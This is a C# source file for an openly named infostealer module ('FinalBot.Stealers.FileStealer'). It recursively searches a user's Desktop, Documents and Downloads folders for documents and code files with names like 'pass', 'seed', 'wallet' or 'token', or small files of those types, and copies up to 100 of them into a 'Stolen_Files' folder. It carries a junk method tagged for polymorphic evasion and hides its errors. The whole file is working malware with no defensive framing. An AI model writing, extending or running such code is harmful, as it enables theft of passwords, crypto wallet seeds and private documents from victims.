using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace FinalBot.Stealers
{
    public class FileStealer
    {
        // [POLY_JUNK]
        private static void _vanguard_2faf0fa9() {
            int val = 60306;
            if (val > 50000) Console.WriteLine("Hash:" + 60306);
        }

        private static readonly string[] Extensions = { ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".rtf", ".php", ".py", ".cpp" };
        private static readonly string[] Keywords = { "pass", "login", "seed", "mnemonic", "wallet", "secret", "account", "crypto", "token", "auth", "credential" };

        public async Task<string> Run(string outputDir)
        {
            string destPath = Path.Combine(outputDir, "Stolen_Files");
            Directory.CreateDirectory(destPath);

            var foldersToScan = new[] {
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")
            };

            int count = 0;
            foreach (var folder in foldersToScan)
            {
                if (Directory.Exists(folder))
                {
                    count += ScanDirectory(folder, destPath);
                }
            }

            return count > 0 ? $"✅ Found {count} interesting files." : "❌ No interesting files found.";
        }

        private int ScanDirectory(string path, string destPath)
        {
            int count = 0;
            try 
            {
                foreach (var file in Directory.GetFiles(path))
                {
                    string name = Path.GetFileName(file).ToLower();
                    string ext = Path.GetExtension(file).ToLower();

                    if (Extensions.Contains(ext))
                    {
                        if (Keywords.Any(k => name.Contains(k)) || new FileInfo(file).Length < 100 * 1024)
                        {
                            try 
                            {
                                string finalDest = Path.Combine(destPath, Path.GetFileName(file));
                                if (!File.Exists(finalDest))
                                {
                                    File.Copy(file, finalDest);
                                    count++;
                                }
                            }
                            catch { }
                        }
                    }
                    if (count >= 100) break; // Limit to 100 files to avoid bloat
                }

                if (count < 100)
                {
                    foreach (var dir in Directory.GetDirectories(path))
                    {
                        // Skip system/temp dirs
                        if (dir.Contains("AppData") || dir.Contains("Windows") || dir.Contains("$Recycle.Bin")) continue;
                        count += ScanDirectory(dir, destPath);
                        if (count >= 100) break;
                    }
                }
            }
            catch { }
            return count;
        }
    }
}
